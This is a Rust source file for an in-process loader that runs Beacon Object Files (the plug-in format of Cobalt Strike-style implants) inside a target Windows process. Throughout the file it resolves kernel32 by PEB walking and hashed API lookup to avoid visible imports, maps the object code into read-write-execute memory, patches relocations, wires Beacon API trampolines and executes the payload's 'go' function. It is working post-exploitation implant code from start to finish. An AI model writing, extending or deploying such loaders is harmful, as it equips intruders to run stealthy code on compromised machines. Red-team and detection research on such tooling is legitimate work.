// loader.rs — In-process COFF/BOF loader
//
// Entry: loader_main(bundle_base: *mut u8)
//   bundle_base[0..4]  = "BCOF"
//   bundle_base[4..8]  = entry_offset  (u32 LE) = 40
//   bundle_base[8..12] = coff_offset   (u32 LE)
//   bundle_base[12..16]= coff_size     (u32 LE)
//   bundle_base[16..20]= args_offset   (u32 LE)
//   bundle_base[20..24]= args_size     (u32 LE)
//   bundle_base[24..32]= output_ptr    (u64 LE) — written by us
//   bundle_base[32..36]= output_size   (u32 LE) — written by us
//
// Pipeline:
//   1. PEB walk → kernel32 → resolve VA, VF, LLA, GPA, ExitThread
//   2. Allocate output buffer (64 KB RW); init global output state
//   3. Allocate working memory: trampolines + IAT slots + COFF sections
//   4. Copy COFF sections into working memory
//   5. Build symbol address table (external symbols → trampolines or IAT)
//   6. Apply COFF relocations
//   7. Find "go" symbol; call go(args_ptr, args_len)
//   8. Write output_ptr / output_size into bundle header
//   9. VirtualFree working memory; ExitThread(0)

use crate::api_hash::{
    get_proc_by_hash,
    FnVirtualAlloc, FnVirtualFree, FnLoadLibraryA, FnGetProcAddress, FnExitThread,
    HASH_VIRTUAL_ALLOC, HASH_VIRTUAL_FREE, HASH_LOAD_LIBRARY_A,
    HASH_GET_PROC_ADDRESS, HASH_EXIT_THREAD,
};
use crate::peb_walk::find_kernel32;

// ── Win32 constants ───────────────────────────────────────────────────────────
const MEM_COMMIT:  u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const MEM_RELEASE: u32 = 0x8000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_READWRITE: u32 = 0x04;

// ── COFF constants ────────────────────────────────────────────────────────────
const COFF_MACH_AMD64:    u16 = 0x8664;
const SYM_CLASS_EXTERNAL: u8  = 2;

// x64 relocation types
const REL_AMD64_ADDR64:  u16 = 0x0001;
const REL_AMD64_ADDR32NB: u16 = 0x0003;
// REL32..REL32_5 are sequential: type - REL_AMD64_REL32 = addend (0..5).
// next_instr offset = 4 + addend.  Only the base constant is needed for the
// range check; the others are computed implicitly in apply_reloc.
const REL_AMD64_REL32:   u16 = 0x0004;
const REL_AMD64_REL32_5: u16 = 0x0009;

// ── Sizing limits ─────────────────────────────────────────────────────────────
const MAX_SECTIONS:     usize = 32;
const MAX_EXT_SYMS:     usize = 256;  // external undefined symbols
const BEACON_API_COUNT: usize = 8;    // Beacon API trampolines
const OUTPUT_CAP:       usize = 64 * 1024;

// ── Global loader state ───────────────────────────────────────────────────────
//
// Non-zero initializers force placement in .data (not .bss) so the PE section
// extractor can include them as raw bytes.  loader_main overwrites all of these
// before any Beacon API stub can be called.
// Safe for single-threaded BOF execution (exec.rs WaitForSingleObject).
static mut G_VA:         usize = 1;
static mut G_VF:         usize = 1;
static mut G_LLA:        usize = 1;
static mut G_GPA:        usize = 1;
static mut G_OUTPUT_PTR: u64   = 1;
static mut G_OUTPUT_LEN: u32   = 1;

// ── Entry point ───────────────────────────────────────────────────────────────
#[no_mangle]
pub unsafe extern "C" fn loader_main(bundle_base: *mut u8) {
    // ── Step 1: Resolve Win32 APIs ────────────────────────────────────────────
    let k32 = find_kernel32();
    if k32.is_null() { return; }

    let va  = core::mem::transmute::<_, FnVirtualAlloc  >(get_proc_by_hash(k32, HASH_VIRTUAL_ALLOC));
    let vf  = core::mem::transmute::<_, FnVirtualFree   >(get_proc_by_hash(k32, HASH_VIRTUAL_FREE));
    let lla = core::mem::transmute::<_, FnLoadLibraryA  >(get_proc_by_hash(k32, HASH_LOAD_LIBRARY_A));
    let gpa = core::mem::transmute::<_, FnGetProcAddress>(get_proc_by_hash(k32, HASH_GET_PROC_ADDRESS));
    let et  = core::mem::transmute::<_, FnExitThread    >(get_proc_by_hash(k32, HASH_EXIT_THREAD));

    if (va as usize) == 0 || (vf  as usize) == 0
    || (lla as usize) == 0 || (gpa as usize) == 0 { return; }

    G_VA  = va  as usize;
    G_VF  = vf  as usize;
    G_LLA = lla as usize;
    G_GPA = gpa as usize;

    // ── Step 2: Allocate output buffer ────────────────────────────────────────
    let out_buf = va(core::ptr::null_mut(), OUTPUT_CAP, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if out_buf.is_null() { return; }
    G_OUTPUT_PTR = out_buf as u64;
    G_OUTPUT_LEN = 0;  // reset (init value is 1 to force .data placement)

    // ── Step 3: Parse bundle header ───────────────────────────────────────────
    let coff_off  = u32_le(bundle_base, 8)  as usize;
    let _coff_size = u32_le(bundle_base, 12) as usize;
    let args_off  = u32_le(bundle_base, 16) as usize;
    let args_size = u32_le(bundle_base, 20) as usize;

    let coff_base = bundle_base.add(coff_off);
    let args_ptr  = if args_size > 0 { bundle_base.add(args_off) } else { core::ptr::null_mut() };

    // ── Step 4: Parse COFF file header ───────────────────────────────────────
    // COFF file header (20 bytes):
    //   +0  machine       u16
    //   +2  num_sections  u16
    //   +4  timestamp     u32
    //   +8  sym_off       u32  (file offset to symbol table)
    //   +12 num_syms      u32
    //   +16 opt_hdr_size  u16  (0 for .o files)
    //   +18 characteristics u16
    let machine     = u16_le(coff_base, 0);
    if machine != COFF_MACH_AMD64 { goto_cleanup(vf, out_buf); return; }

    let num_sections = u16_le(coff_base, 2) as usize;
    let sym_off      = u32_le(coff_base, 8) as usize;
    let num_syms     = u32_le(coff_base, 12) as usize;

    if num_sections > MAX_SECTIONS { goto_cleanup(vf, out_buf); return; }

    // String table immediately follows symbol table
    let strtab = coff_base.add(sym_off + num_syms * 18);

    // ── Step 5: Measure total section data size ───────────────────────────────
    // Section header (40 bytes each), starts at COFF header + 20
    let sec_hdrs = coff_base.add(20);
    let mut total_sec_size: usize = 0;
    let mut i = 0;
    while i < num_sections {
        let sh = sec_hdrs.add(i * 40);
        let raw = u32_le(sh, 16) as usize;
        total_sec_size += (raw + 15) & !15; // 16-byte align each section
        i += 1;
    }

    // Working alloc layout (RWX):
    //   [0..tramp_size]     Beacon API trampolines  (BEACON_API_COUNT * 16)
    //   [tramp_size..iat_end]  IAT slots             (MAX_EXT_SYMS * 8)
    //   [iat_end..]         COFF section data
    let tramp_size = BEACON_API_COUNT * 16;
    let iat_size   = MAX_EXT_SYMS * 8;
    let work_size  = tramp_size + iat_size + total_sec_size;

    let work = va(core::ptr::null_mut(), work_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if work.is_null() { goto_cleanup(vf, out_buf); return; }

    let tramp_base = work;
    let iat_base   = work.add(tramp_size);
    let sec_base   = work.add(tramp_size + iat_size);

    // ── Step 6: Install Beacon API trampolines ────────────────────────────────
    // Each trampoline is 16 bytes:
    //   48 B8 <8 bytes imm64>   MOV RAX, imm64
    //   FF E0                   JMP RAX
    //   90 90 90 90             NOP padding
    install_trampoline(tramp_base, 0,  beacon_output    as *const () as usize);
    install_trampoline(tramp_base, 1,  beacon_printf    as *const () as usize);
    install_trampoline(tramp_base, 2,  beacon_data_parse   as *const () as usize);
    install_trampoline(tramp_base, 3,  beacon_data_int     as *const () as usize);
    install_trampoline(tramp_base, 4,  beacon_data_short   as *const () as usize);
    install_trampoline(tramp_base, 5,  beacon_data_length  as *const () as usize);
    install_trampoline(tramp_base, 6,  beacon_data_extract as *const () as usize);
    install_trampoline(tramp_base, 7,  beacon_is_admin     as *const () as usize);

    // ── Step 7: Copy sections into working memory ────────────────────────────
    let mut section_bases: [*mut u8; MAX_SECTIONS] = [core::ptr::null_mut(); MAX_SECTIONS];
    let mut cursor = sec_base;
    let mut s = 0;
    while s < num_sections {
        let sh       = sec_hdrs.add(s * 40);
        let raw_size = u32_le(sh, 16) as usize;
        let raw_off  = u32_le(sh, 20) as usize;

        section_bases[s] = cursor;
        if raw_size > 0 && raw_off > 0 {
            raw_copy(cursor, coff_base.add(raw_off), raw_size);
        }
        cursor = cursor.add((raw_size + 15) & !15);
        s += 1;
    }

    // ── Step 8: Build external symbol → address table ────────────────────────
    // ext_syms[i] = (sym_table_index, resolved_address)
    let mut ext_sym_idx: [u32; MAX_EXT_SYMS]      = [0u32; MAX_EXT_SYMS];
    let mut ext_sym_addr: [*mut u8; MAX_EXT_SYMS] = [core::ptr::null_mut(); MAX_EXT_SYMS];
    let mut num_ext = 0usize;
    let mut iat_slot = 0usize;  // next free IAT slot index

    let mut go_addr: *mut u8 = core::ptr::null_mut();

    let mut sym_i = 0u32;
    while sym_i < num_syms as u32 {
        let sym = coff_base.add(sym_off + sym_i as usize * 18);
        let sec_num  = i16_le(sym, 12);
        let class    = *sym.add(16);
        let aux_cnt  = *sym.add(17);

        let name_buf = sym_name(sym, strtab);

        // Check for "go" function
        if sec_num > 0 && matches_str(name_buf, b"go") {
            let val = u32_le(sym, 8) as usize;
            go_addr = section_bases[sec_num as usize - 1].add(val);
        }

        // External undefined symbol
        if class == SYM_CLASS_EXTERNAL && sec_num == 0 && num_ext < MAX_EXT_SYMS {
            let addr = resolve_external(
                name_buf, tramp_base, iat_base, &mut iat_slot, lla, gpa,
            );
            if !addr.is_null() {
                ext_sym_idx[num_ext]  = sym_i;
                ext_sym_addr[num_ext] = addr;
                num_ext += 1;
            }
        }

        sym_i += 1 + aux_cnt as u32; // skip aux records
    }

    // ── Step 9: Apply COFF relocations ───────────────────────────────────────
    let mut s2 = 0usize;
    while s2 < num_sections {
        let sh        = sec_hdrs.add(s2 * 40);
        let reloc_off = u32_le(sh, 24) as usize;
        let num_reloc = u16_le(sh, 32) as usize;
        let sec_mem   = section_bases[s2];

        let mut r = 0usize;
        while r < num_reloc {
            // Relocation entry (10 bytes):
            //   +0 virtual_address: u32  (offset within section)
            //   +4 sym_index:       u32
            //   +8 type:            u16
            let rel     = coff_base.add(reloc_off + r * 10);
            let vaddr   = u32_le(rel, 0) as usize;
            let sym_idx = u32_le(rel, 4);
            let rel_ty  = u16_le(rel, 8);

            let patch = sec_mem.add(vaddr) as *mut u8;

            // Resolve the symbol's runtime address
            let sym_va: *mut u8 = sym_addr(
                sym_idx, coff_base, sym_off, num_syms,
                strtab, &section_bases, num_sections,
                &ext_sym_idx, &ext_sym_addr, num_ext,
            );

            if sym_va.is_null() { r += 1; continue; }

            apply_reloc(patch, sym_va, rel_ty);
            r += 1;
        }
        s2 += 1;
    }

    // ── Step 10: Call go(args, args_size) ─────────────────────────────────────
    if !go_addr.is_null() {
        let go_fn: unsafe extern "C" fn(*mut u8, i32) =
            core::mem::transmute(go_addr);
        go_fn(args_ptr, args_size as i32);
    }

    // ── Step 11: Write output to bundle header ────────────────────────────────
    (bundle_base.add(24) as *mut u64).write_unaligned(G_OUTPUT_PTR);
    (bundle_base.add(32) as *mut u32).write_unaligned(G_OUTPUT_LEN);

    // ── Step 12: Free working memory ─────────────────────────────────────────
    vf(work, 0, MEM_RELEASE);

    // ExitThread(0) — loader thread exits cleanly
    if (et as usize) != 0 {
        et(0);
    }
    loop { core::arch::asm!("pause", options(nostack, nomem)); }
}

// ── Beacon API stubs ──────────────────────────────────────────────────────────

// datap struct layout on x64 (24 bytes):
//   +0  original: *mut u8
//   +8  buffer:   *mut u8
//   +16 length:   i32
//   +20 size:     i32

/// Append data to the output buffer.  Called by BOF code via trampoline.
#[no_mangle]
pub unsafe extern "C" fn beacon_output(_kind: i32, data: *const u8, len: i32) {
    if data.is_null() || len <= 0 { return; }
    let len = len as usize;
    let cur_len = G_OUTPUT_LEN as usize;
    if cur_len + len > OUTPUT_CAP { return; }
    let dst = G_OUTPUT_PTR as *mut u8;
    if dst.is_null() { return; }
    raw_copy(dst.add(cur_len), data, len);
    G_OUTPUT_LEN = (cur_len + len) as u32;
}

/// Printf-style output — emits the format string as-is (no substitution).
/// BOFs call this with additional args in registers/stack; we ignore them
/// since x64 calling convention leaves extra args in registers we never read.
#[no_mangle]
pub unsafe extern "C" fn beacon_printf(kind: i32, fmt: *const u8) {
    if fmt.is_null() { return; }
    let mut len = 0usize;
    while *fmt.add(len) != 0 { len += 1; }
    beacon_output(kind, fmt, len as i32);
}

#[no_mangle]
pub unsafe extern "C" fn beacon_data_parse(parser: *mut u8, buf: *mut u8, size: i32) {
    if parser.is_null() { return; }
    (parser         as *mut u64).write_unaligned(buf as u64); // original
    (parser.add(8)  as *mut u64).write_unaligned(buf as u64); // buffer
    (parser.add(16) as *mut i32).write_unaligned(size);       // length
    (parser.add(20) as *mut i32).write_unaligned(size);       // size
}

/// Read a little-endian i32 from the parser.
#[no_mangle]
pub unsafe extern "C" fn beacon_data_int(parser: *mut u8) -> i32 {
    if parser.is_null() { return 0; }
    let len = (parser.add(16) as *const i32).read_unaligned();
    if len < 4 { return 0; }
    let buf = (parser.add(8) as *const *const u8).read_unaligned();
    let v = (buf as *const i32).read_unaligned(); // LE
    (parser.add(8)  as *mut u64).write_unaligned(buf.add(4) as u64);
    (parser.add(16) as *mut i32).write_unaligned(len - 4);
    v
}

/// Read a little-endian i16 from the parser.
#[no_mangle]
pub unsafe extern "C" fn beacon_data_short(parser: *mut u8) -> i16 {
    if parser.is_null() { return 0; }
    let len = (parser.add(16) as *const i32).read_unaligned();
    if len < 2 { return 0; }
    let buf = (parser.add(8) as *const *const u8).read_unaligned();
    let v = (buf as *const i16).read_unaligned();
    (parser.add(8)  as *mut u64).write_unaligned(buf.add(2) as u64);
    (parser.add(16) as *mut i32).write_unaligned(len - 2);
    v
}

/// Return remaining bytes in parser.
#[no_mangle]
pub unsafe extern "C" fn beacon_data_length(parser: *mut u8) -> i32 {
    if parser.is_null() { return 0; }
    (parser.add(16) as *const i32).read_unaligned()
}

/// Read a big-endian length-prefixed byte blob from the parser.
/// Returns pointer into the buffer; writes actual length to *out_len if non-null.
#[no_mangle]
pub unsafe extern "C" fn beacon_data_extract(parser: *mut u8, out_len: *mut i32) -> *mut u8 {
    if parser.is_null() { return core::ptr::null_mut(); }
    let rem = (parser.add(16) as *const i32).read_unaligned();
    if rem < 4 { return core::ptr::null_mut(); }
    let buf = (parser.add(8) as *const *mut u8).read_unaligned();
    // Length is big-endian u32
    let b0 = *buf.add(0) as u32;
    let b1 = *buf.add(1) as u32;
    let b2 = *buf.add(2) as u32;
    let b3 = *buf.add(3) as u32;
    let data_len = (b0 << 24) | (b1 << 16) | (b2 << 8) | b3;
    let total = 4 + data_len as i32;
    if rem < total { return core::ptr::null_mut(); }
    if !out_len.is_null() { *out_len = data_len as i32; }
    let data_ptr = buf.add(4);
    (parser.add(8)  as *mut u64).write_unaligned(buf.add(total as usize) as u64);
    (parser.add(16) as *mut i32).write_unaligned(rem - total);
    data_ptr
}

/// Stub: returns 0 (not admin).  A full implementation would query the token.
#[no_mangle]
pub unsafe extern "C" fn beacon_is_admin() -> i32 {
    0
}

// ── Internal helpers ──────────────────────────────────────────────────────────

unsafe fn goto_cleanup(vf: FnVirtualFree, out_buf: *mut u8) {
    if !out_buf.is_null() { vf(out_buf, 0, MEM_RELEASE); }
}

/// Install a 16-byte MOV RAX, imm64 / JMP RAX trampoline.
#[inline(always)]
unsafe fn install_trampoline(base: *mut u8, idx: usize, target: usize) {
    let p = base.add(idx * 16);
    // 48 B8 <imm64>  MOV RAX, imm64
    *p.add(0) = 0x48;
    *p.add(1) = 0xB8;
    (p.add(2) as *mut u64).write_unaligned(target as u64);
    // FF E0  JMP RAX
    *p.add(10) = 0xFF;
    *p.add(11) = 0xE0;
    // NOP padding to fill 16 bytes
    *p.add(12) = 0x90;
    *p.add(13) = 0x90;
    *p.add(14) = 0x90;
    *p.add(15) = 0x90;
}

/// Resolve an external symbol.  Returns the address to embed in the relocation.
/// - `__imp_LIBRARY$FUNCTION` → IAT slot containing the resolved fn pointer
/// - `BeaconXxx` names        → trampoline address
/// - others                   → null (relocation is skipped)
unsafe fn resolve_external(
    name:       *const u8,
    tramp_base: *mut u8,
    iat_base:   *mut u8,
    iat_slot:   &mut usize,
    lla:        FnLoadLibraryA,
    gpa:        FnGetProcAddress,
) -> *mut u8 {
    if name.is_null() { return core::ptr::null_mut(); }

    // ── Beacon API direct references ──────────────────────────────────────────
    if matches_str(name, b"BeaconOutput")         { return tramp_base.add(0  * 16); }
    if matches_str(name, b"BeaconPrintf")         { return tramp_base.add(1  * 16); }
    if matches_str(name, b"BeaconDataParse")      { return tramp_base.add(2  * 16); }
    if matches_str(name, b"BeaconDataInt")        { return tramp_base.add(3  * 16); }
    if matches_str(name, b"BeaconDataShort")      { return tramp_base.add(4  * 16); }
    if matches_str(name, b"BeaconDataLength")     { return tramp_base.add(5  * 16); }
    if matches_str(name, b"BeaconDataExtract")    { return tramp_base.add(6  * 16); }
    if matches_str(name, b"BeaconIsAdmin")        { return tramp_base.add(7  * 16); }

    // ── __imp_LIBRARY$FUNCTION → IAT slot ─────────────────────────────────────
    // Symbol name: "__imp_KERNEL32$VirtualAlloc"
    //               0123456 = "__imp_" prefix
    if !starts_with(name, b"__imp_") { return core::ptr::null_mut(); }

    // Find '$' separator
    let after_prefix = name.add(6);
    let mut dollar: usize = 0;
    loop {
        if *after_prefix.add(dollar) == 0   { return core::ptr::null_mut(); }
        if *after_prefix.add(dollar) == b'$' { break; }
        dollar += 1;
    }
    // library = after_prefix[0..dollar], function = after_prefix[dollar+1..]

    // Build "library.dll\0" in a stack buffer
    let mut lib_buf = [0u8; 64];
    let lib_name = after_prefix;
    let lib_len  = dollar;
    if lib_len + 5 >= 64 { return core::ptr::null_mut(); } // ".dll\0"
    raw_copy(lib_buf.as_mut_ptr(), lib_name, lib_len);
    // Lowercase the library name for LoadLibraryA
    let mut k = 0;
    while k < lib_len {
        let c = lib_buf[k];
        if c >= b'A' && c <= b'Z' { lib_buf[k] = c + 32; }
        k += 1;
    }
    lib_buf[lib_len]     = b'.';
    lib_buf[lib_len + 1] = b'd';
    lib_buf[lib_len + 2] = b'l';
    lib_buf[lib_len + 3] = b'l';
    lib_buf[lib_len + 4] = 0;

    let hmod = lla(lib_buf.as_ptr());
    if hmod.is_null() { return core::ptr::null_mut(); }

    // Build "FunctionName\0"
    let func_name = after_prefix.add(dollar + 1);
    let mut fn_buf = [0u8; 128];
    let mut fn_len = 0usize;
    while fn_len < 127 {
        let c = *func_name.add(fn_len);
        if c == 0 { break; }
        fn_buf[fn_len] = c;
        fn_len += 1;
    }
    fn_buf[fn_len] = 0;

    let fn_ptr = gpa(hmod, fn_buf.as_ptr());
    if fn_ptr.is_null() { return core::ptr::null_mut(); }

    // Allocate an IAT slot and store the resolved address
    if *iat_slot >= MAX_EXT_SYMS { return core::ptr::null_mut(); }
    let slot = iat_base.add(*iat_slot * 8);
    (slot as *mut u64).write_unaligned(fn_ptr as u64);
    *iat_slot += 1;
    slot
}

/// Look up the runtime address of the symbol at `sym_table_index`.
/// For section symbols: section_base + symbol.Value.
/// For external symbols: from the pre-built ext table.
unsafe fn sym_addr(
    sym_idx:     u32,
    coff_base:   *const u8,
    sym_off:     usize,
    num_syms:    usize,
    _strtab:     *const u8,
    sec_bases:   &[*mut u8],
    num_sections: usize,
    ext_idx:     &[u32],
    ext_addr:    &[*mut u8],
    num_ext:     usize,
) -> *mut u8 {
    if sym_idx as usize >= num_syms { return core::ptr::null_mut(); }
    let sym     = coff_base.add(sym_off + sym_idx as usize * 18);
    let sec_num = i16_le(sym, 12);
    let class   = *sym.add(16);

    if class == SYM_CLASS_EXTERNAL && sec_num == 0 {
        // Look up in external symbol table
        let mut i = 0;
        while i < num_ext {
            if ext_idx[i] == sym_idx {
                return ext_addr[i];
            }
            i += 1;
        }
        return core::ptr::null_mut();
    }

    if sec_num > 0 {
        let sn = (sec_num - 1) as usize;
        if sn < num_sections {
            let val = u32_le(sym, 8) as usize;
            return sec_bases[sn].add(val);
        }
    }

    core::ptr::null_mut()
}

/// Apply a single COFF x64 relocation.
#[inline(always)]
unsafe fn apply_reloc(patch: *mut u8, sym_va: *mut u8, rel_ty: u16) {
    match rel_ty {
        REL_AMD64_ADDR64 => {
            (patch as *mut u64).write_unaligned(sym_va as u64);
        }
        REL_AMD64_ADDR32NB => {
            // 32-bit relative without image base — rare; treat as 32-bit offset
            let delta = sym_va as i64 - patch as i64;
            (patch as *mut i32).write_unaligned(delta as i32);
        }
        r if r >= REL_AMD64_REL32 && r <= REL_AMD64_REL32_5 => {
            // REL32_n: next instruction offset = 4 + (r - REL32)
            let addend = (r - REL_AMD64_REL32) as usize;
            let next_instr = patch as usize + 4 + addend;
            let delta = sym_va as i64 - next_instr as i64;
            (patch as *mut i32).write_unaligned(delta as i32);
        }
        _ => {} // unsupported type — skip
    }
}

// ── Symbol name helpers ───────────────────────────────────────────────────────

/// Return a pointer to the null-terminated symbol name.
/// For short names (≤ 8 chars) it's inline at sym+0.
/// For long names, it's in the string table at strtab + u32_le(sym, 4).
/// Inline names are NOT null-terminated when exactly 8 chars — we return
/// a temporary stack buffer for those.  Since we only compare, not store,
/// returning the sym pointer directly works: the comparison functions
/// check up to the null OR up to the target length (whichever is shorter).
/// The caller must NOT hold this pointer across iterations.
#[inline(always)]
unsafe fn sym_name(sym: *const u8, strtab: *const u8) -> *const u8 {
    // If first 4 bytes are zero, the name is in the string table
    if (sym as *const u32).read_unaligned() == 0 {
        let off = u32_le(sym as *mut u8, 4) as usize;
        return strtab.add(off);
    }
    // Otherwise the name is stored inline (up to 8 bytes, may not be null-terminated)
    sym
}

/// Case-sensitive comparison of a (possibly non-null-terminated, ≤8-byte) name
/// against a null-terminated literal.
#[inline(always)]
unsafe fn matches_str(name: *const u8, target: &[u8]) -> bool {
    let tlen = target.len(); // target is a null-terminated literal without the \0
    let mut i = 0;
    while i < tlen {
        let c = *name.add(i);
        if c == 0 { return false; } // name ended before target
        if c != target[i] { return false; }
        i += 1;
    }
    // name[tlen] must be 0 or we're at the 8-byte limit with no more chars
    let term = *name.add(tlen);
    term == 0 || (tlen == 8) // 8-char names may not have null terminator
}

#[inline(always)]
unsafe fn starts_with(name: *const u8, prefix: &[u8]) -> bool {
    let mut i = 0;
    while i < prefix.len() {
        if *name.add(i) != prefix[i] { return false; }
        i += 1;
    }
    true
}

// ── Byte utilities ────────────────────────────────────────────────────────────

#[inline(always)]
unsafe fn u16_le(base: *const u8, off: usize) -> u16 {
    (base.add(off) as *const u16).read_unaligned()
}

#[inline(always)]
unsafe fn i16_le(base: *const u8, off: usize) -> i16 {
    (base.add(off) as *const i16).read_unaligned()
}

#[inline(always)]
unsafe fn u32_le(base: *const u8, off: usize) -> u32 {
    (base.add(off) as *const u32).read_unaligned()
}

/// Safe byte copy without CRT memcpy.
#[inline(always)]
unsafe fn raw_copy(dst: *mut u8, src: *const u8, count: usize) {
    if count == 0 { return; }
    core::arch::asm!(
        "rep movsb",
        inout("rdi") dst   => _,
        inout("rsi") src   => _,
        inout("rcx") count => _,
        options(nostack),
    );
}
